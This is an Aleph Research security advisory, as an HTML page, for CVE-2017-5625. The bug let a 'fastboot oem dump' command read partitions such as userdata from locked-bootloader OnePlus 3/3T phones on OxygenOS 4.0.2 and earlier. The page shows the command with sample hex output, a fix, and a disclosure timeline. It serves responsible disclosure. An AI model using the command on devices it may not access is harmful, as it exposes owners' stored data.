<!DOCTYPE html>
<html lang="en">
<head>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-92665328-1"></script>
<script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        
        gtag('config', 'UA-92665328-1');
    </script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<title>[CVE-2017-5625] OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot</title>
<meta name="name" content="CVE-2017-5625">
<meta name="description" content="OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot">
<meta name="image" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta name="twitter:card" content="summary">
<meta name="twitter:site" content="@alephsecurity">
<meta name="twitter:creator" content="@alephsecurity">
<meta name="twitter:title" content="CVE-2017-5625">
<meta name="twitter:url" content="https://alephsecurity.com/vulns/aleph-2017006">
<meta name="twitter:description" content="OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot">
<meta name="twitter:image:src" content="https://alephsecurity.com/assets/img/logo-black.png">
<meta property="og:site_name" content="">
<meta property="og:title" content="CVE-2017-5625">
<meta property="og:type" content="article">
<meta property="og:description" content="OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot">
<meta property="og:url" content="https://alephsecurity.com/vulns/aleph-2017006">
<meta property="article:published_time" content="2017-04-25T00:00:00+00:00">
<meta property="article:author" content="https://alephsecurity.com">
<meta property="og:image" content="https://alephsecurity.com/assets/img/logo-black.png">
<link rel="icon" href="/favicon.png">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata:400,700">
<link rel="stylesheet" type="text/css" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      messageStyle: "none",
      tex2jax: {preview: "none"},
      CommonHTML: { linebreaks: { automatic: true } },
      "HTML-CSS": { linebreaks: { automatic: true } },
      SVG: { linebreaks: { automatic: true } }
    });
    </script>
<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
    </script>
</head>
<body>
<div class="wrapper">
<div class="page__back">
<a href="/">&lt;-- <span class="smallogo">א</span></a>
</div>
<div class="page">
<div class="advisory">
<div class="advisory__title">
<h1>OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot</h1>
</div>
<div class="advisory__subtitle">
Aleph Research Advisory
</div>
<div class="advisory__meta">
<p></p>
</div>
<h2>Identifier</h2>
<div class="cve-moderate"><span class="" title="OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot"><a href="/vulns/aleph-2017006">CVE-2017-5625</a></span></div>
<h2>Severity</h2>
Moderate
<h2>Products</h2>
<div class="numberedlistnoalternative">
<ol>
<li><p>OnePlus 3T</p>
</li>
<li><p>OnePlus 3</p>
</li>
</ol>
</div>
<h2>Vulnerable Version</h2>
<p>OxygenOS 4.0.2 and earlier</p>
<h2>Mitigation</h2>
<p>Install OxygenOS 4.0.3 or later</p>
<h2>Summary</h2>
<div class="advisory__content" ?>
<p>A physical attacker, PC malware / malicious charger having ADB or fastboot access to the device can cause a locked bootloader to partially dump the content of an arbitrary partition (except <code class="language-plaintext highlighter-rouge">keystore</code>) by issuing the <code class="language-plaintext highlighter-rouge">fastboot oem dump &lt;partition&gt;</code> fastboot command.</p>
</div>
<h2>Technical Details</h2>
<div class="advisory__content" ?>
<p>The bootloader’s fastboot interface must not allow any security-sensitive operation to be run unless the bootloader is unlocked. However, in the affected OnePlus devices and OxygenOS versions, one could partially dump the content of any partition (except keystore):</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>fastboot oem dump userdata
<span class="go">[...]
(bootloader) Dump partition: userdata
(bootloader) C0C7A7D7DFE7BA0214A21F3366313AF2DA7B36AEF27B5C40694D9534B2D
(bootloader) 3B19C068DEED8C7D333037AB6B770494DD054076171B1D33555C7EEC3FB
(bootloader) E793F5692B86E95D4D697FA98966D82E256103641605149439404A89309
(bootloader) 9EFFB47DFC976857BDE7D388A0DC45B84A97CCD7A0F9CD592EE50D6D6EE
(bootloader) 239E3D9829DFC8627A0F19D8D73FE258A7B576C31DACBAB0EB8B5D01679
(bootloader) B78A8C51D338385A853E4E2A3DBA2A873FC707BEE052F56168050964B94
[...]
</span></code></pre></div></div>
<p>And indeed the data is correct:</p>
<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">OnePlus3:/dev/block/bootdevice/by-name #</span><span class="w"> </span><span class="nb">head </span>userdata | <span class="nb">od</span> <span class="nt">-tx</span>
<span class="go">0000000 c0c7a7d7 dfe7ba02 14a21f33 66313af2
0000020 da7b36ae f27b5c40 694d9534 b2d361fa
0000040 2cd4f050 79e5e97c 55be1782 b34fbfef
0000060 1edc578b b8cdaf6d 24dfaf1b d7461400
0000100 3b19c068 deed8c7d 333037ab 6b770494
0000120 dd054076 171b1d33 0555c7ee c3fb029b
0000140 4f92d8a2 2af74432 e07bf276 42e3639e
0000160 d5979e35 7cd4adcb ed181221 09a484d1
</span></code></pre></div></div>
<p>One may argue that this is not an issue because userdata is encrypted, however please note that:</p>
<ol>
<li>Google has recently patched a vulnerability with a similar impact in Pixel (<a href="https://securityresear.ch/2017/01/04/fastboot-oem-sha1sum/">CVE-2016-8462</a>). It was rated with ‘High’ severity.</li>
<li>Other vulnerabilies (if found) can be used in order to leak the <a href="https://android.googlesource.com/platform/system/vold/+/android-7.1.1_r38/cryptfs.c">AES master key</a> from memory.</li>
</ol>
</div>
<h2>Timeline</h2>
<div class="list"><ul><li><div class="list__date"><span>25-Apr-17<span></div>: Public disclosure.</li><li><div class="list__date"><span>20-Mar-17<span></div>: Patch available.</li><li><div class="list__date"><span>01-Mar-17<span></div>: Added as <span class="cve-moderate" title="OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot"><a href="/vulns/aleph-2017006">ALEPH-2017006</a></span>.</li><li><div class="list__date"><span>29-Jan-17<span></div>: <span class="cve-moderate" title="OnePlus 3/3T OxygenOS Unauthorized Flash Dumping via fastboot"><a href="/vulns/aleph-2017006">CVE-2017-5625</a></span> assigned.</li><li><div class="list__date"><span>25-Jan-17<span></div>: CVE ID requested.</li><li><div class="list__date"><span>23-Jan-17<span></div>: Reported.</li></ul></div>

<h2>Credit</h2>
<div class="list">
<ul>
<li>
<a href="/authors/roeeh">Roee Hay</a> (<a href="https://twitter.com/roeehay">@roeehay</a>) of Aleph Research, HCL Technologies
</li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>
